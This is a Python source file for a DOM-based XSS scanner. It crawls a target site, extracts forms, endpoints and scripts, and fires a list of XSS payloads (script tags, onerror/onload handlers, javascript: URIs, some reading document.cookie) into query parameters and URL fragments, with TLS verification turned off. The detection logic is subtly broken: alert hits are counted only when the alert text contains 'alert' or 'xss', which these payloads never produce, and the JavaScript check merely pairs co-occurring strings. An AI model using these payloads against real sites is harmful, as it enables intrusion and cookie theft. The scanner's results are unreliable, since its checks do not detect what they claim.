import requests
import urllib.parse
import time
import random
import re
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

class DOMXSSScanner:
    def __init__(self):
        self.options = {
            "URL": "",
            "TIMEOUT": "10",
            "DELAY": "0",
            "COOKIE": "",
            "USER_AGENT": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "HEADERS": "",
            "USE_SELENIUM": True,
            "HEADLESS": True,
            "DEPTH": "2",
            "FOLLOW_REDIRECTS": True,
            "ANALYZE_JS": True,
            "EXTRACT_ENDPOINTS": True
        }
        
        self.dom_xss_payloads = [
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<script>alert(1)</script>",
            "<iframe src=javascript:alert(1)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<select onfocus=alert(1) autofocus>",
            "<textarea onfocus=alert(1) autofocus>",
            "<keygen onfocus=alert(1) autofocus>",
            "<video><source onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
            "<details ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>",
            "'\"><img src=x onerror=alert(1)>",
            "'\"><svg onload=alert(1)>",
            "'\"><script>alert(1)</script>",
            "javascript:alert(1)",
            "JaVaScRiPt:alert(1)",
            "javascript:alert(String.fromCharCode(88,83,83))",
            "<script>alert(document.domain)</script>",
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=alert(document.cookie)>",
            "<svg onload=alert(document.cookie)>",
            "<script>eval('alert(1)')</script>",
            "<script>setTimeout('alert(1)',0)</script>",
            "<script>document.write('<img src=x onerror=alert(1)>')</script>"
        ]
        
        self.dom_sink_patterns = [
            "document.write",
            "document.writeln",
            "document.body.innerHTML",
            "element.innerHTML",
            "element.outerHTML",
            "element.insertAdjacentHTML",
            "element.setAttribute",
            "window.location",
            "window.name",
            "eval",
            "setTimeout",
            "setInterval",
            "Function",
            "script.src",
            "element.cssText",
            "element.style",
            "document.cookie",
            "document.referrer",
            "document.URL",
            "document.documentURI",
            "document.baseURI",
            "document.title",
            "element.text",
            "element.textContent",
            "element.innerText"
        ]
        
        self.dom_source_patterns = [
            "location.href",
            "location.search",
            "location.hash",
            "location.pathname",
            "document.URL",
            "document.documentURI",
            "document.referrer",
            "window.name",
            "document.cookie",
            "localStorage",
            "sessionStorage",
            "document.baseURI"
        ]
        
        self.selenium_options = None
        self.driver = None
        
    def set_option(self, key, value):
        self.options[key] = value
    
    def get_option(self, key):
        return self.options[key]
    
    def setup_selenium(self):
        if not self.get_option("USE_SELENIUM"):
            return False
            
        chrome_options = Options()
        
        if self.get_option("HEADLESS"):
            chrome_options.add_argument("--headless")
        
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument(f"--user-agent={self.get_option('USER_AGENT')}")
        
        try:
            self.driver = webdriver.Chrome(options=chrome_options)
            return True
        except:
            return False
    
    def close_selenium(self):
        if self.driver:
            self.driver.quit()
            self.driver = None
    
    def get_page_content(self, url):
        try:
            headers = {
                "User-Agent": self.get_option("USER_AGENT"),
                "Cookie": self.get_option("COOKIE")
            }
            
            if self.get_option("HEADERS"):
                try:
                    for header in self.get_option("HEADERS").split("\\n"):
                        if ":" in header:
                            key, value = header.split(":", 1)
                            headers[key.strip()] = value.strip()
                except:
                    pass
            
            response = requests.get(url, timeout=int(self.get_option("TIMEOUT")), 
                                  headers=headers, verify=False,
                                  allow_redirects=self.get_option("FOLLOW_REDIRECTS"))
            
            return response.text, response.status_code
        except Exception as e:
            return "", 0
    
    def extract_forms(self, html):
        soup = BeautifulSoup(html, 'html.parser')
        forms = []
        
        for form in soup.find_all('form'):
            form_details = {}
            action = form.get('action', '')
            method = form.get('method', 'get').lower()
            
            inputs = []
            for input_tag in form.find_all('input'):
                input_type = input_tag.get('type', 'text')
                input_name = input_tag.get('name', '')
                input_value = input_tag.get('value', '')
                
                if input_name:
                    inputs.append({
                        'type': input_type,
                        'name': input_name,
                        'value': input_value
                    })
            
            for select in form.find_all('select'):
                select_name = select.get('name', '')
                if select_name:
                    inputs.append({
                        'type': 'select',
                        'name': select_name,
                        'value': ''
                    })
            
            for textarea in form.find_all('textarea'):
                textarea_name = textarea.get('name', '')
                if textarea_name:
                    inputs.append({
                        'type': 'textarea',
                        'name': textarea_name,
                        'value': ''
                    })
            
            form_details['action'] = action
            form_details['method'] = method
            form_details['inputs'] = inputs
            
            forms.append(form_details)
        
        return forms
    
    def extract_endpoints(self, html, base_url):
        endpoints = []
        soup = BeautifulSoup(html, 'html.parser')
        
        for a_tag in soup.find_all('a', href=True):
            href = a_tag['href']
            if href.startswith('http') or href.startswith('/'):
                if href.startswith('/'):
                    href = base_url + href
                endpoints.append(href)
        
        for script in soup.find_all('script', src=True):
            src = script['src']
            if src.startswith('http') or src.startswith('/'):
                if src.startswith('/'):
                    src = base_url + src
                endpoints.append(src)
        
        for link in soup.find_all('link', href=True):
            href = link['href']
            if href.startswith('http') or href.startswith('/'):
                if href.startswith('/'):
                    href = base_url + href
                endpoints.append(href)
        
        for form in soup.find_all('form'):
            action = form.get('action', '')
            if action and (action.startswith('http') or action.startswith('/')):
                if action.startswith('/'):
                    action = base_url + action
                endpoints.append(action)
        
        return list(set(endpoints))
    
    def extract_javascript_sources(self, html):
        js_sources = []
        soup = BeautifulSoup(html, 'html.parser')
        
        for script in soup.find_all('script'):
            if script.string:
                js_sources.append(script.string)
        
        for script in soup.find_all('script', src=True):
            src = script['src']
            if src.startswith('http') or src.startswith('/'):
                try:
                    response = requests.get(src, timeout=int(self.get_option("TIMEOUT")), verify=False)
                    if response.status_code == 200:
                        js_sources.append(response.text)
                except:
                    pass
        
        return js_sources
    
    def analyze_javascript_for_dom_xss(self, js_code):
        vulnerabilities = []
        
        for source in self.dom_source_patterns:
            for sink in self.dom_sink_patterns:
                if source in js_code and sink in js_code:
                    vulnerabilities.append({
                        "type": "Potential DOM-based XSS",
                        "source": source,
                        "sink": sink
                    })
        
        return vulnerabilities
    
    def test_url_parameter(self, url, param_name):
        vulnerabilities = []
        
        for payload in self.dom_xss_payloads:
            try:
                parsed_url = urllib.parse.urlparse(url)
                query_params = urllib.parse.parse_qs(parsed_url.query)
                
                query_params[param_name] = [payload]
                new_query = urllib.parse.urlencode(query_params, doseq=True)
                
                test_url = urllib.parse.urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    new_query,
                    parsed_url.fragment
                ))
                
                if self.get_option("USE_SELENIUM") and self.driver:
                    self.driver.get(test_url)
                    time.sleep(2)
                    
                    try:
                        alert = self.driver.switch_to.alert
                        alert_text = alert.text
                        alert.accept()
                        
                        if "alert" in alert_text.lower() or "xss" in alert_text.lower():
                            vulnerabilities.append({
                                "url": test_url,
                                "parameter": param_name,
                                "payload": payload,
                                "type": "DOM-based XSS (Alert triggered)"
                            })
                    except:
                        pass
                else:
                    html, status = self.get_page_content(test_url)
                    
                    if payload in html:
                        vulnerabilities.append({
                            "url": test_url,
                            "parameter": param_name,
                            "payload": payload,
                            "type": "DOM-based XSS (Payload reflected)"
                        })
                
                time.sleep(float(self.get_option("DELAY")))
            except Exception:
                pass
        
        return vulnerabilities
    
    def test_fragment_parameter(self, url):
        vulnerabilities = []
        
        for payload in self.dom_xss_payloads:
            try:
                test_url = url + "#" + urllib.parse.quote(payload)
                
                if self.get_option("USE_SELENIUM") and self.driver:
                    self.driver.get(test_url)
                    time.sleep(2)
                    
                    try:
                        alert = self.driver.switch_to.alert
                        alert_text = alert.text
                        alert.accept()
                        
                        if "alert" in alert_text.lower() or "xss" in alert_text.lower():
                            vulnerabilities.append({
                                "url": test_url,
                                "parameter": "fragment",
                                "payload": payload,
                                "type": "DOM-based XSS (Fragment - Alert triggered)"
                            })
                    except:
                        pass
                
                time.sleep(float(self.get_option("DELAY")))
            except Exception:
                pass
        
        return vulnerabilities
    
    def run(self):
        url = self.get_option("URL")
        if not url:
            return {"success": False, "message": "URL is required"}
        
        if self.get_option("USE_SELENIUM"):
            self.setup_selenium()
        
        try:
            vulnerabilities = []
            
            html, status = self.get_page_content(url)
            
            if self.get_option("ANALYZE_JS"):
                js_sources = self.extract_javascript_sources(html)
                for js_code in js_sources:
                    js_vulnerabilities = self.analyze_javascript_for_dom_xss(js_code)
                    vulnerabilities.extend(js_vulnerabilities)
            
            parsed_url = urllib.parse.urlparse(url)
            query_params = urllib.parse.parse_qs(parsed_url.query)
            
            for param_name in query_params:
                param_vulnerabilities = self.test_url_parameter(url, param_name)
                vulnerabilities.extend(param_vulnerabilities)
            
            fragment_vulnerabilities = self.test_fragment_parameter(url)
            vulnerabilities.extend(fragment_vulnerabilities)
            
            if self.get_option("EXTRACT_ENDPOINTS"):
                endpoints = self.extract_endpoints(html, f"{parsed_url.scheme}://{parsed_url.netloc}")
                
                for endpoint in endpoints[:int(self.get_option("DEPTH"))]:
                    if endpoint != url:
                        endpoint_html, endpoint_status = self.get_page_content(endpoint)
                        
                        if endpoint_html:
                            endpoint_parsed = urllib.parse.urlparse(endpoint)
                            endpoint_query_params = urllib.parse.parse_qs(endpoint_parsed.query)
                            
                            for param_name in endpoint_query_params:
                                endpoint_vulnerabilities = self.test_url_parameter(endpoint, param_name)
                                vulnerabilities.extend(endpoint_vulnerabilities)
                            
                            endpoint_fragment_vulnerabilities = self.test_fragment_parameter(endpoint)
                            vulnerabilities.extend(endpoint_fragment_vulnerabilities)
            
            if vulnerabilities:
                return {
                    "success": True,
                    "message": f"Found {len(vulnerabilities)} potential DOM-based XSS vulnerabilities",
                    "vulnerabilities": vulnerabilities
                }
            else:
                return {
                    "success": True,
                    "message": "No DOM-based XSS vulnerabilities detected"
                }
        finally:
            self.close_selenium()
